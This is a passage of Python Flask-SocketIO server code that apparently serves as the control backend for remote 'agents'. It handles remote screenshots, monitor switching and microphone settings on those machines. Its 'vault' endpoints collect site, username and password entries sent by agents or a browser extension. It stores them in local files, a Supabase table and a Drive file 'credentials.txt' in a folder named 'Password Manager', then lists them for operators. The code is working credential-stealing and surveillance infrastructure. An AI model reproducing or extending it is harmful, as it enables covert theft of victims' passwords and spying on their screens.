    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('switch_monitor', {'monitor_index': monitor_index}, room=agent_sid)

@socketio.on('set_display_mode')
def handle_set_display_mode(data):
    agent_id = data.get('agent_id')
    mode = data.get('mode')
    pip_monitor = data.get('pip_monitor')
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('set_display_mode', {'mode': mode, 'pip_monitor': pip_monitor}, room=agent_sid)

@socketio.on('set_audio_volumes')
def handle_set_audio_volumes(data):
    agent_id = data.get('agent_id')
    mic_volume = data.get('mic_volume', 1.0)
    system_volume = data.get('system_volume', 1.0)
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('set_audio_volumes', {'mic_volume': mic_volume, 'system_volume': system_volume}, room=agent_sid)

@socketio.on('toggle_noise_reduction')
def handle_toggle_noise_reduction(data):
    agent_id = data.get('agent_id')
    enabled = data.get('enabled', False)
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('toggle_noise_reduction', {'enabled': enabled}, room=agent_sid)

@socketio.on('toggle_echo_cancellation')
def handle_toggle_echo_cancellation(data):
    agent_id = data.get('agent_id')
    enabled = data.get('enabled', False)
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('toggle_echo_cancellation', {'enabled': enabled}, room=agent_sid)
@socketio.on('get_screenshot')
def handle_get_screenshot(data):
    agent_id = data.get('agent_id')
    origin_sid = request.sid
    print(f"[SCREENSHOT] Request from operator {origin_sid} for agent {agent_id}")
    agent_sid = AGENTS_DATA.get(agent_id, {}).get('sid')
    if agent_sid:
        emit('get_screenshot', {'agent_id': agent_id, 'origin_sid': origin_sid}, room=agent_sid)
    else:
        emit('status_update', {'message': f'Agent {agent_id} not found or disconnected.', 'type': 'error'}, room=origin_sid)
        emit('screenshot_response', {
            'agent_id': agent_id,
            'success': False,
            'error': 'Agent not connected',
            'duration_ms': 0,
            'attempts': 1
        }, room=origin_sid)
@socketio.on('screenshot_response')
def handle_screenshot_response(data):
    try:
        agent_id = (data or {}).get('agent_id')
        img_b64 = (data or {}).get('image') or ''
        target_sid = (data or {}).get('target_sid')
        ok = bool((data or {}).get('success'))
        size = len(img_b64) if isinstance(img_b64, str) else 0
        print(f"[SCREENSHOT] Response from agent {agent_id}, success={ok}, size={size}, target_sid={target_sid}")
        valid = False
        decoded = None
        if isinstance(img_b64, str) and size > 0:
            try:
                import base64
                decoded = base64.b64decode(img_b64, validate=True)
                valid = decoded[:8] == b'\x89PNG\r\n\x1a\n'
            except Exception:
                valid = False
        if ok:
            if not valid or size < 100:
                data = {
                    'agent_id': agent_id,
                    'success': False,
                    'error': 'Invalid or too-small screenshot',
                    'duration_ms': (data or {}).get('duration_ms') or 0,
                    'attempts': (data or {}).get('attempts') or 1
                }
            else:
                try:
                    import os, time
                    upload_dir = os.path.join(os.getcwd(), 'uploads', 'screenshots')
                    os.makedirs(upload_dir, exist_ok=True)
                    fname = f"{agent_id}-{int(time.time()*1000)}.png"
                    path = os.path.join(upload_dir, fname)
                    with open(path, 'wb') as f:
                        f.write(decoded)
                    data['image_size'] = size
                    data['file_path'] = path
                except Exception as e:
                    print(f"[SCREENSHOT] Save failed: {e}")
        if target_sid:
            emit('screenshot_response', data, room=target_sid)
        else:
            emit('screenshot_response', data, room='operators')
    except Exception as e:
        print(f"[SCREENSHOT] Error in handle_screenshot_response: {e}")
@socketio.on('agent_heartbeat')
def handle_agent_heartbeat(data):
    agent_id = (data or {}).get('agent_id')
    if not agent_id:
        return
    if agent_id not in AGENTS_DATA:
        AGENTS_DATA[agent_id] = {}
    prev_sid = AGENTS_DATA[agent_id].get('sid')
    AGENTS_DATA[agent_id]['last_seen'] = datetime.datetime.utcnow().isoformat() + 'Z'
    AGENTS_DATA[agent_id]['sid'] = request.sid
    if not AGENTS_DATA[agent_id].get('name'):
        AGENTS_DATA[agent_id]['name'] = f'Agent-{agent_id}'
    if prev_sid != request.sid:
        emit('agent_list_update', _agents_payload(), room='operators')

@socketio.on('vault_status')
def handle_vault_status(data):
    agent_id = (data or {}).get('agent_id')
    active = bool((data or {}).get('active'))
    installed = bool((data or {}).get('installed'))
    if not agent_id:
        return
    if agent_id not in AGENTS_DATA:
        AGENTS_DATA[agent_id] = {}
    AGENTS_DATA[agent_id]['vault_active'] = active
    AGENTS_DATA[agent_id]['vault_installed'] = installed
    emit('agent_list_update', _agents_payload(), room='operators')

DRIVE_CFG = {'ready': False, 'sa': None, 'token': None, 'exp': 0, 'root_id': None, 'folders': {}, 'last': {'status': None, 'body': None, 'url': None}}
def drive_load_sa():
    import os, json
    s = os.environ.get('GOOGLE_DRIVE_SERVICE_ACCOUNT_JSON') or os.environ.get('GOOGLE_SERVICE_ACCOUNT_JSON') or ''
    p = os.environ.get('GOOGLE_APPLICATION_CREDENTIALS') or ''
    data = None
    try:
        if s:
            data = json.loads(s)
        elif p:
            with open(p, 'r', encoding='utf-8') as f:
                data = json.load(f)
    except Exception:
        data = None
    DRIVE_CFG['sa'] = data
    DRIVE_CFG['ready'] = bool(data)

def drive_get_user_token():
    import os, time, requests
    now = int(time.time())
    # Prefer cached user token
    if DRIVE_CFG.get('user_token') and DRIVE_CFG.get('user_exp', 0) - 60 > now:
        return DRIVE_CFG['user_token']
    cid = os.environ.get('GOOGLE_OAUTH_CLIENT_ID')
    sec = os.environ.get('GOOGLE_OAUTH_CLIENT_SECRET')
    refresh = DRIVE_CFG.get('oauth_refresh_token') or os.environ.get('GOOGLE_DRIVE_REFRESH_TOKEN')
    if not (cid and sec and refresh):
        return None
    try:
        resp = requests.post("https://oauth2.googleapis.com/token", data={
            "grant_type": "refresh_token",
            "client_id": cid,
            "client_secret": sec,
            "refresh_token": refresh,
        }, timeout=10)
        js = resp.json()
        tok = js.get('access_token')
        if tok:
            DRIVE_CFG['user_token'] = tok
            DRIVE_CFG['user_exp'] = now + int(js.get('expires_in', 3600))
            return tok
    except Exception:
        return None
    return None

def drive_get_token():
    import time, json, base64, requests
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import padding
    # Prefer user OAuth token when available
    utok = drive_get_user_token()
    if utok:
        return utok
    if not DRIVE_CFG.get('sa'):
        drive_load_sa()
    sa = DRIVE_CFG.get('sa')
    if not sa:
        return None
    now = int(time.time())
    if DRIVE_CFG.get('token') and DRIVE_CFG.get('exp', 0) - 60 > now:
        return DRIVE_CFG['token']
    header = {"alg": "RS256", "typ": "JWT"}
    payload = {
        "iss": sa["client_email"],
        "scope": "https://www.googleapis.com/auth/drive",
        "aud": "https://oauth2.googleapis.com/token",
        "iat": now,
        "exp": now + 3600
    }
    def b64u(x):
        if isinstance(x, bytes):
            data = x
        else:
            data = json.dumps(x, separators=(',', ':')).encode()
        return base64.urlsafe_b64encode(data).rstrip(b'=')
    signing_input = b'.'.join([b64u(header), b64u(payload)])
    key = serialization.load_pem_private_key(sa["private_key"].encode(), password=None)
    sig = key.sign(signing_input, padding.PKCS1v15(), hashes.SHA256())
    assertion = signing_input + b'.' + base64.urlsafe_b64encode(sig).rstrip(b'=')
    data = {"grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer", "assertion": assertion.decode()}
    try:
        resp = requests.post("https://oauth2.googleapis.com/token", data=data, timeout=10)
        js = resp.json()
        tok = js.get('access_token')
        if tok:
            DRIVE_CFG['token'] = tok
            DRIVE_CFG['exp'] = now + int(js.get('expires_in', 3600))
            return tok
    except Exception:
        return None
    return None

def drive_api(method, url, headers=None, params=None, data=None):
    import requests
    tok = drive_get_token()
    if not tok:
        return None
    h = {'Authorization': f'Bearer {tok}'}
    if headers:
        h.update(headers)
    try:
        resp = requests.request(method, url, headers=h, params=params, data=data, timeout=15)
        try:
            DRIVE_CFG['last'] = {'status': getattr(resp, 'status_code', None), 'body': getattr(resp, 'text', None), 'url': url}
        except Exception:
            pass
        return resp
    except Exception:
        return None

def drive_find_folder(name, parent=None):
    base = "https://www.googleapis.com/drive/v3/files"
    q = f"name = '{name}' and mimeType = 'application/vnd.google-apps.folder' and trashed = false"
    if parent:
        q += f" and '{parent}' in parents"
    resp = drive_api("GET", base, params={"q": q, "fields": "files(id,name)", "supportsAllDrives": "true"})
    try:
        items = resp.json().get('files', []) if resp is not None and resp.ok else []
        if items:
            return items[0]['id']
    except Exception:
        pass
    return None

def drive_create_folder(name, parent=None):
    import json
    base = "https://www.googleapis.com/drive/v3/files"
    meta = {"name": name, "mimeType": "application/vnd.google-apps.folder"}
    if parent:
        meta["parents"] = [parent]
    resp = drive_api("POST", base, headers={"Content-Type": "application/json"}, data=json.dumps(meta), params={"supportsAllDrives": "true"})
    try:
        if resp is not None and resp.ok:
            fid = resp.json().get('id')
            try:
                import os
                share_email = os.environ.get('GOOGLE_DRIVE_SHARE_EMAIL')
                if share_email:
                    drive_share_user(fid, share_email, role="writer")
            except Exception:
                pass
            return fid
    except Exception:
        pass
    return None

def drive_ensure_root():
    if not DRIVE_CFG.get('ready'):
        drive_load_sa()
    if not DRIVE_CFG.get('sa'):
        return None
    # Allow overriding the root folder with an environment variable
    try:
        import os
        env_root = os.environ.get('GOOGLE_DRIVE_ROOT_ID')
        if env_root:
            # Accept either a Shared Drive id or a folder id, prefer write probe
            drv = drive_get_drive(env_root)
            if drv:
                DRIVE_CFG['root_id'] = env_root
                return env_root
            # Try as a folder id
            if drive_has_write_access(env_root):
                DRIVE_CFG['root_id'] = env_root
                return env_root
    except Exception:
        pass
    rid = DRIVE_CFG.get('root_id')
    if rid:
        return rid
    rid = drive_find_folder("Password Manager", None)
    if not rid:
        rid = drive_create_folder("Password Manager", None)
    DRIVE_CFG['root_id'] = rid
    return rid

def drive_ensure_agent_folder(agent_id):
    agent_map = DRIVE_CFG.setdefault('folders', {})
    if agent_id in agent_map:
        return agent_map[agent_id]
    root = drive_ensure_root()
    if not root:
        return None
    fid = drive_find_folder(agent_id, root)
    if not fid:
        fid = drive_create_folder(agent_id, root)
    if fid:
        agent_map[agent_id] = fid
    return fid

def drive_share_user(file_id, email, role="writer"):
    import json
    url = f"https://www.googleapis.com/drive/v3/files/{file_id}/permissions"
    body = {"type": "user", "role": role, "emailAddress": email}
    # Do not send notification emails for service account shares
    params = {"sendNotificationEmail": "false", "supportsAllDrives": "true"}
    resp = drive_api("POST", url, headers={"Content-Type": "application/json"}, params=params, data=json.dumps(body).encode("utf-8"))
    return resp is not None and (resp.ok or resp.status_code in (200, 201))

def drive_find_file(parent_id, name):
    base = "https://www.googleapis.com/drive/v3/files"
    q = f"name = '{name}' and '{parent_id}' in parents and trashed = false"
    resp = drive_api("GET", base, params={"q": q, "fields": "files(id,name,mimeType)", "supportsAllDrives": "true"})
    try:
        items = resp.json().get('files', []) if resp is not None and resp.ok else []
        if items:
            return items[0]['id']
    except Exception:
        pass
    return None
def drive_list_children(parent_id):
    base = "https://www.googleapis.com/drive/v3/files"
    q = f"'{parent_id}' in parents and trashed = false"
    resp = drive_api("GET", base, params={"q": q, "fields": "files(id,name,mimeType,size,modifiedTime)", "supportsAllDrives": "true"})
    try:
        if resp is not None and resp.ok:
            return resp.json().get('files', []) or []
    except Exception:
        pass
    return []

def drive_get_file_content(file_id):
    url = f"https://www.googleapis.com/drive/v3/files/{file_id}"
    resp = drive_api("GET", url, params={"alt": "media", "supportsAllDrives": "true"})
    if resp is not None and resp.ok:
        try:
            return resp.text
        except Exception:
            return ""
    return ""

def drive_get_file_mime(file_id):
    url = f"https://www.googleapis.com/drive/v3/files/{file_id}"
    resp = drive_api("GET", url, params={"fields": "mimeType", "supportsAllDrives": "true"})
    try:
        if resp is not None and resp.ok:
            return resp.json().get('mimeType') or ""
    except Exception:
        pass
    return ""

def drive_create_text_file(parent_id, name, content):
    import json, uuid
    meta = {"name": name, "mimeType": "text/plain", "parents": [parent_id]}
    # Prefer multipart create with content in one request
    boundary = "pm" + str(uuid.uuid4()).replace("-", "")
    body = []
    body.append(f"--{boundary}\r\nContent-Type: application/json; charset=UTF-8\r\n\r\n")
    body.append(json.dumps(meta))
    body.append(f"\r\n--{boundary}\r\nContent-Type: text/plain\r\n\r\n")
    body.append(content)
    body.append(f"\r\n--{boundary}--\r\n")
    data = "".join(body).encode("utf-8")
    url_multi = "https://www.googleapis.com/upload/drive/v3/files"
    resp2 = drive_api("POST", url_multi, headers={"Content-Type": f"multipart/related; boundary={boundary}"}, params={"uploadType": "multipart", "supportsAllDrives": "true"}, data=data)
    try:
        if resp2 is not None and resp2.ok:
            return resp2.json().get('id')
    except Exception:
        pass
    # Fallback: create meta then upload content
    url_meta = "https://www.googleapis.com/drive/v3/files"
    resp1 = drive_api("POST", url_meta, headers={"Content-Type": "application/json"}, params={"supportsAllDrives": "true"}, data=json.dumps(meta).encode("utf-8"))
    fid = None
    try:
        if resp1 is not None and resp1.ok:
            fid = resp1.json().get('id')
    except Exception:
        fid = None
    if fid:
        if drive_update_text_file(fid, content) or drive_update_text_file_multipart(fid, content) or drive_update_text_file_put(fid, content):
            return fid
    return None

def drive_delete_file(file_id):
    url = f"https://www.googleapis.com/drive/v3/files/{file_id}"
    resp = drive_api("DELETE", url)
    return resp is not None and (resp.ok or resp.status_code == 204)

def drive_has_write_access(parent_id):
    import uuid
    probe_name = f".pm_perm_probe_{str(uuid.uuid4())[:8]}"
    fid = drive_create_folder(probe_name, parent_id)
    if not fid:
        return False
    try:
        drive_delete_file(fid)
    except Exception:
        pass
    try:
        text_id = drive_create_text_file(parent_id, f".pm_write_probe_{str(uuid.uuid4())[:8]}.txt", "ok")
        if not text_id:
            return False
        try:
            drive_delete_file(text_id)
        except Exception:
            pass
    except Exception:
        return False
    return True

def drive_get_file_info(file_id):
    url = f"https://www.googleapis.com/drive/v3/files/{file_id}"
    resp = drive_api("GET", url, params={"fields": "id,name,mimeType,driveId,parents,capabilities/canAddChildren,owners(emailAddress)", "supportsAllDrives": "true"})
    try:
        if resp is not None and resp.ok:
            return resp.json()
    except Exception:
        pass
    return None

def drive_get_drive(drive_id):
    url = f"https://www.googleapis.com/drive/v3/drives/{drive_id}"
    resp = drive_api("GET", url)
    try:
        if resp is not None and resp.ok:
            return resp.json()
    except Exception:
        pass
    return None

def drive_update_text_file(file_id, content):
    url = f"https://www.googleapis.com/upload/drive/v3/files/{file_id}"
    resp = drive_api("PATCH", url, headers={"Content-Type": "text/plain"}, params={"uploadType": "media", "supportsAllDrives": "true"}, data=content.encode("utf-8"))
    return resp is not None and resp.ok

def drive_update_text_file_put(file_id, content):
    url = f"https://www.googleapis.com/upload/drive/v3/files/{file_id}"
    resp = drive_api("PUT", url, headers={"Content-Type": "text/plain"}, params={"uploadType": "media", "supportsAllDrives": "true"}, data=content.encode("utf-8"))
    return resp is not None and resp.ok

def drive_update_text_file_multipart(file_id, content):
    import json, uuid
    boundary = "pmu" + str(uuid.uuid4()).replace("-", "")
    meta = {"mimeType": "text/plain"}
    body = []
    body.append(f"--{boundary}\r\nContent-Type: application/json; charset=UTF-8\r\n\r\n")
    body.append(json.dumps(meta))
    body.append(f"\r\n--{boundary}\r\nContent-Type: text/plain\r\n\r\n")
    body.append(content)
    body.append(f"\r\n--{boundary}--\r\n")
    data = "".join(body).encode("utf-8")
    url = f"https://www.googleapis.com/upload/drive/v3/files/{file_id}"
    resp = drive_api("PATCH", url, headers={"Content-Type": f"multipart/related; boundary={boundary}"}, params={"uploadType": "multipart", "supportsAllDrives": "true"}, data=data)
    return resp is not None and resp.ok

def drive_update_text_file_resumable(file_id, content):
    import json
    # Initialize resumable session
    init_url = f"https://www.googleapis.com/upload/drive/v3/files/{file_id}"
    init_resp = drive_api("PATCH", init_url, headers={"Content-Type": "application/json; charset=UTF-8"}, params={"uploadType": "resumable", "supportsAllDrives": "true"}, data=json.dumps({}).encode("utf-8"))
    if not (init_resp is not None and (init_resp.ok or init_resp.status_code in (200, 201))):
        return False
    session_url = None
    try:
        session_url = init_resp.headers.get("Location")
    except Exception:
        session_url = None
    if not session_url:
        return False
    # Upload content to session URL
    try:
        import requests
        tok = DRIVE_CFG.get('token') or drive_get_token()
        if not tok:
            return False
        headers = {
            "Authorization": f"Bearer {tok}",
            "Content-Type": "text/plain",
        }
        put_resp = requests.put(session_url, headers=headers, data=content.encode("utf-8"), timeout=30)
        return put_resp is not None and (put_resp.ok or put_resp.status_code in (200, 201))
    except Exception:
        return False

def drive_safe_write_text(parent_id, name, content):
    fid = drive_find_file(parent_id, name)
    if not fid:
        created = drive_create_text_file(parent_id, name, content)
        return (created is not None), ("create_failed" if not created else None)
    # Try standard update chain
    ok = drive_update_text_file(fid, content) or drive_update_text_file_multipart(fid, content) or drive_update_text_file_put(fid, content) or drive_update_text_file_resumable(fid, content)
    if ok:
        return True, None
    # If failed, re-discover file id in case of stale ID
    try:
        fid2 = drive_find_file(parent_id, name)
    except Exception:
        fid2 = None
    if fid2 and fid2 != fid:
        ok2 = drive_update_text_file(fid2, content) or drive_update_text_file_multipart(fid2, content) or drive_update_text_file_put(fid2, content) or drive_update_text_file_resumable(fid2, content)
        if ok2:
            return True, None
        fid = fid2
    # Final fallback: recreate file fresh
    try:
        drive_delete_file(fid)
    except Exception:
        pass
    created2 = drive_create_text_file(parent_id, name, content)
    return (created2 is not None), ("recreate_failed" if not created2 else None)

def drive_write_full(agent_id, content):
    try:
        parent = drive_ensure_agent_folder(agent_id)
        if not parent:
            return False, "no_parent_folder"
        fname = "credentials.txt"
        ok, err = drive_safe_write_text(parent, fname, content)
        return ok, err if not ok else None
    except Exception as e:
        return False, str(e)

def drive_append_line(agent_id, line):
    try:
        parent = drive_ensure_agent_folder(agent_id)
        if not parent:
            return False
        fname = "credentials.txt"
        # Read current content if present, then append new line and write safely
        fid = drive_find_file(parent, fname)
        if fid:
            old = drive_get_file_content(fid) or ""
            new = old + ("" if old.endswith("\n") or old == "" else "\n") + line + "\n"
        else:
            new = line + "\n"
        ok, _ = drive_safe_write_text(parent, fname, new)
        return ok
    except Exception:
        return False
@app.route('/api/drive/test', methods=['GET'])
def api_drive_test():
    return jsonify({'success': False, 'error': 'drive_disabled'})

@app.route('/api/drive/access', methods=['GET'])
def api_drive_access():
    return jsonify({'success': False, 'error': 'drive_disabled'})

@app.route('/api/drive/list', methods=['GET'])
def api_drive_list():
    return jsonify({'success': False, 'error': 'drive_disabled'})

@app.route('/api/drive/info', methods=['GET'])
def api_drive_info():
    return jsonify({'success': False, 'error': 'drive_disabled'})

def supabase_enabled():
    import os
    url = os.environ.get('SUPABASE_URL') or os.environ.get('SUPABASE_REST_URL')
    key = os.environ.get('SUPABASE_SERVICE_ROLE_KEY') or os.environ.get('SUPABASE_SERVICE_KEY') or os.environ.get('SUPABASE_KEY') or os.environ.get('SUPABASE_SECRET')
    return bool(url and key)

def supabase_insert(table, row):
    import os, json, requests
    url = os.environ.get('SUPABASE_URL') or os.environ.get('SUPABASE_REST_URL')
    key = os.environ.get('SUPABASE_SERVICE_ROLE_KEY') or os.environ.get('SUPABASE_SERVICE_KEY') or os.environ.get('SUPABASE_KEY') or os.environ.get('SUPABASE_SECRET')
    if not (url and key):
        return False, 'supabase_not_configured'
    api = url.rstrip('/') + '/rest/v1/' + table
    headers = {
        'apikey': key,
        'Authorization': f'Bearer {key}',
        'Content-Type': 'application/json',
        'Prefer': 'return=representation'
    }
    try:
        resp = requests.post(api, headers=headers, data=json.dumps(row).encode('utf-8'), timeout=15)
        if resp is None:
            return False, 'no_response'
        ok = resp.ok or resp.status_code in (200, 201)
        return ok, (None if ok else resp.text)
    except Exception as e:
        return False, str(e)

@app.route('/api/vault/ingest', methods=['POST', 'OPTIONS'])
def api_vault_ingest():
    if request.method == 'OPTIONS':
        r = jsonify({'success': True})
        r.status_code = 204
        try:
            r.headers['Access-Control-Allow-Origin'] = '*'
            r.headers['Access-Control-Allow-Headers'] = 'Content-Type'
            r.headers['Access-Control-Allow-Methods'] = 'POST, OPTIONS'
        except Exception:
            pass
        return r
    try:
        data = None
        try:
            data = request.get_json(silent=True)
        except Exception:
            data = None
        if not data:
            raw = request.data or b''
            try:
                data = json.loads(raw.decode('utf-8'))
            except Exception:
                txt = raw.decode('utf-8', errors='ignore')
                data = {'raw': txt}
        site = (data or {}).get('site') or ''
        username = (data or {}).get('user') or (data or {}).get('username') or ''
        password = (data or {}).get('pass') or (data or {}).get('password') or ''
        agent_id = (data or {}).get('agent_id')
        if not agent_id:
            try:
                ip = request.headers.get('X-Forwarded-For', request.environ.get('REMOTE_ADDR', '0.0.0.0')).split(',')[0].strip()
                best = None
                best_ts = 0
                now = datetime.datetime.utcnow().timestamp()
                for aid, info in AGENTS_DATA.items():
                    aip = str(info.get('ip') or '')
                    if aip == ip:
                        try:
                            ts = datetime.datetime.fromisoformat((info.get('last_seen') or '').replace('Z', '+00:00')).timestamp()
                        except Exception:
                            ts = 0
                        if ts > best_ts and (now - ts) < (10 * 60):
                            best = aid
                            best_ts = ts
                agent_id = best or 'EXTENSION'
            except Exception:
                agent_id = 'EXTENSION'
        ts = (data or {}).get('time') or datetime.datetime.utcnow().isoformat() + 'Z'
        base = os.path.join(os.getcwd(), 'uploads', 'vault')
        os.makedirs(base, exist_ok=True)
        path = os.path.join(base, f'{agent_id}.txt')
        try:
            with open(path, 'a', encoding='utf-8') as f:
                f.write(f'[{ts}] {site} | {username} | {password}\n')
        except Exception:
            pass
        try:
            emit('vault_update', {'agent_id': agent_id}, room='operators')
        except Exception:
            pass
        stored = False
        err = None
        if supabase_enabled():
            row = {
                'agent_id': agent_id,
                'site': site,
                'username': username,
                'password': password,
                'time': ts,
                'created_at': datetime.datetime.utcnow().isoformat() + 'Z'
            }
            stored, err = supabase_insert('vault_entries', row)
        r = jsonify({'success': True, 'stored': bool(stored), 'error': err})
        try:
            r.headers['Access-Control-Allow-Origin'] = '*'
        except Exception:
            pass
        return r
    except Exception as e:
        r = jsonify({'success': False, 'error': str(e)})
        try:
            r.headers['Access-Control-Allow-Origin'] = '*'
        except Exception:
            pass
        return r

def supabase_select(table, params):
    import os, requests
    url = os.environ.get('SUPABASE_URL') or os.environ.get('SUPABASE_REST_URL')
    key = os.environ.get('SUPABASE_SERVICE_ROLE_KEY') or os.environ.get('SUPABASE_SERVICE_KEY') or os.environ.get('SUPABASE_KEY') or os.environ.get('SUPABASE_SECRET')
    api = url.rstrip('/') + '/rest/v1/' + table
    headers = {'apikey': key, 'Authorization': f'Bearer {key}'}
    try:
        resp = requests.get(api, headers=headers, params=params, timeout=15)
        if resp is not None and resp.ok:
            return True, resp.json()
        return False, resp.text if resp is not None else 'no_response'
    except Exception as e:
        return False, str(e)

@app.route('/api/vault/agents', methods=['GET'])
def api_vault_agents():
    try:
        agents = []
        if supabase_enabled():
            ok, data = supabase_select('vault_entries', {'select': 'agent_id,count:count()', 'group': 'agent_id'})
            if not (ok and isinstance(data, list) and len(data) > 0):
                ok, data = supabase_select('vault_entries', {'select': 'agent_id'})
                if ok and isinstance(data, list):
                    cnts = {}
                    for row in data:
                        aid = str(row.get('agent_id') or '')
                        cnts[aid] = cnts.get(aid, 0) + 1
                    agents = [{'id': k, 'count': v} for k, v in cnts.items()]
            else:
                for row in data:
                    aid = str(row.get('agent_id') or '')
                    cnt = int(row.get('count') or 0)
                    agents.append({'id': aid, 'count': cnt})
        return jsonify({'agents': agents})
    except Exception as e:
        return jsonify({'agents': [], 'error': str(e)}), 500

@app.route('/api/vault/<agent_id>', methods=['GET'])
def api_vault_entries(agent_id):
    try:
        entries = []
        if supabase_enabled():
            ok, data = supabase_select('vault_entries', {'select': 'site,username,password,time,created_at', 'agent_id': f'eq.{agent_id}', 'order': 'created_at.desc'})
            if ok and isinstance(data, list):
                for row in data:
                    entries.append({
                        'site': str(row.get('site') or ''),
                        'username': str(row.get('username') or ''),
                        'password': str(row.get('password') or ''),
                        'time': str(row.get('time') or row.get('created_at') or '')
                    })
        return jsonify({'entries': entries})
    except Exception as e:
        return jsonify({'entries': [], 'error': str(e)}), 500

@app.route('/api/vault/resolve-agent', methods=['GET'])
def api_vault_resolve_agent():
    try:
        ip = request.headers.get('X-Forwarded-For', request.environ.get('REMOTE_ADDR', '0.0.0.0')).split(',')[0].strip()
        best = None
        best_ts = 0
        now = datetime.datetime.utcnow().timestamp()
        for aid, info in AGENTS_DATA.items():
            aip = str(info.get('ip') or '')
            if aip == ip:
                try:
                    ts = datetime.datetime.fromisoformat((info.get('last_seen') or '').replace('Z', '+00:00')).timestamp()
                except Exception:
                    ts = 0
                if ts > best_ts and (now - ts) < (10 * 60):
                    best = aid
                    best_ts = ts
        return jsonify({'agent_id': best})
    except Exception as e:
        return jsonify({'agent_id': None, 'error': str(e)}), 500

@app.route('/api/drive/oauth/start', methods=['GET'])
def api_drive_oauth_start():
    import os, uuid, urllib.parse
    cid = os.environ.get('GOOGLE_OAUTH_CLIENT_ID')
    redirect = os.environ.get('GOOGLE_OAUTH_REDIRECT_URI') or 'http://127.0.0.1:8080/api/drive/oauth/callback'
    if not cid:
        return jsonify({'success': False, 'error': 'GOOGLE_OAUTH_CLIENT_ID not set'})
    state = 'pm-' + str(uuid.uuid4())
    DRIVE_CFG['oauth_state'] = state
    params = {
        'client_id': cid,
        'redirect_uri': redirect,
        'response_type': 'code',
        'access_type': 'offline',
        'prompt': 'consent',
        'include_granted_scopes': 'true',
        'scope': 'https://www.googleapis.com/auth/drive'
    }
    url = 'https://accounts.google.com/o/oauth2/v2/auth?' + urllib.parse.urlencode(params)
    return jsonify({'success': True, 'auth_url': url, 'state': state})

@app.route('/api/drive/oauth/callback')
def api_drive_oauth_callback():
    import os, time, requests
    code = request.args.get('code')
    state = request.args.get('state')
    cid = os.environ.get('GOOGLE_OAUTH_CLIENT_ID')
    sec = os.environ.get('GOOGLE_OAUTH_CLIENT_SECRET')
    redirect = os.environ.get('GOOGLE_OAUTH_REDIRECT_URI') or 'http://127.0.0.1:8080/api/drive/oauth/callback'
    if not (code and cid and sec):
        return jsonify({'success': False, 'error': 'missing code or client env'})
    if state and DRIVE_CFG.get('oauth_state') and state != DRIVE_CFG['oauth_state']:
        return jsonify({'success': False, 'error': 'state mismatch'})
    try:
        resp = requests.post('https://oauth2.googleapis.com/token', data={
            'grant_type': 'authorization_code',
            'client_id': cid,
            'client_secret': sec,
            'code': code,
            'redirect_uri': redirect,
            'access_type': 'offline',
        }, timeout=10)
        js = resp.json()
        refresh = js.get('refresh_token')
        tok = js.get('access_token')
        exp = int(time.time()) + int(js.get('expires_in', 3600))
        if refresh:
            DRIVE_CFG['oauth_refresh_token'] = refresh
        if tok:
            DRIVE_CFG['user_token'] = tok
            DRIVE_CFG['user_exp'] = exp
        return jsonify({'success': True, 'refresh_token': refresh, 'access_token': tok, 'expires_in': js.get('expires_in')})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})
@socketio.on('vault_entry')
def handle_vault_entry(data):
    try:
        agent_id = (data or {}).get('agent_id')
        site = (data or {}).get('site') or ''
        username = (data or {}).get('username') or ''
        password = (data or {}).get('password') or ''
        if not agent_id or not site or not username or not password:
            return
        import os
        base = os.path.join(os.getcwd(), 'uploads', 'vault')
        os.makedirs(base, exist_ok=True)
        path = os.path.join(base, f'{agent_id}.txt')
        with open(path, 'a', encoding='utf-8') as f:
            f.write(f'{site}|{username}|{password}\n')
        try:
            ts = datetime.datetime.utcnow().isoformat() + 'Z'
            # Build full content from local file so Drive always has the complete list
            try:
                with open(path, 'r', encoding='utf-8') as rf:
                    lines = []
                    for raw in rf:
                        raw = raw.strip()
                        if not raw:
                            continue
                        parts = raw.split('|', 2)
                        if len(parts) == 3:
                            lines.append(f'[{ts}] {parts[0]} | {parts[1]} | {parts[2]}')
                    full_content = "\n".join(lines) + ("\n" if lines else "")
            except Exception:
                full_content = f'[{ts}] {site} | {username} | {password}\n'
            ok, err = drive_write_full(agent_id, full_content)
            emit('drive_store_result', {'agent_id': agent_id, 'success': bool(ok), 'file': 'credentials.txt', 'error': err}, room='operators')
        except Exception as e:
            emit('drive_store_result', {'agent_id': agent_id, 'success': False, 'file': 'credentials.txt', 'error': str(e) or 'exception'}, room='operators')
        emit('vault_update', {'agent_id': agent_id}, room='operators')
    except Exception:
        pass

@socketio.on('ping')
def handle_ping(data):
    """Handle ping from agent and respond with pong"""
    agent_id = data.get('agent_id')
    timestamp = data.get('timestamp')
    uptime = data.get('uptime', 0)
    
    # Update agent data if it exists
    if agent_id in AGENTS_DATA:
        AGENTS_DATA[agent_id]['last_seen'] = datetime.datetime.utcnow().isoformat() + 'Z'
        AGENTS_DATA[agent_id]['uptime'] = uptime
        
        # Periodically update operators with agent status (every 10 pings to avoid spam)
        if not hasattr(handle_ping, 'ping_count'):
            handle_ping.ping_count = {}
        handle_ping.ping_count[agent_id] = handle_ping.ping_count.get(agent_id, 0) + 1
        
        if handle_ping.ping_count[agent_id] % 10 == 0:
            print(f"Updating operators with agent {agent_id} status after {handle_ping.ping_count[agent_id]} pings")
            emit('agent_list_update', _agents_payload(), room='operators')
    
    # Send pong response
    emit('pong', {
        'agent_id': agent_id,
        'timestamp': timestamp,
        'server_time': datetime.datetime.utcnow().isoformat() + 'Z',
        'status': 'ok'
    })
    print(f"Ping received from {agent_id}, sent pong")

@socketio.on('agent_register')
def handle_agent_register(data):
    """Handle agent registration"""
    try:
        if not data or not isinstance(data, dict):
            print(f"Invalid agent_register data received: {data}")
            emit('registration_error', {'message': 'Invalid registration data'})
            return
            
        agent_id = data.get('agent_id')
        platform = data.get('platform', 'unknown')
        python_version = data.get('python_version', 'unknown')
        timestamp = data.get('timestamp')
        
        if not agent_id:
            emit('registration_error', {'message': 'Agent ID required'})
            return
        
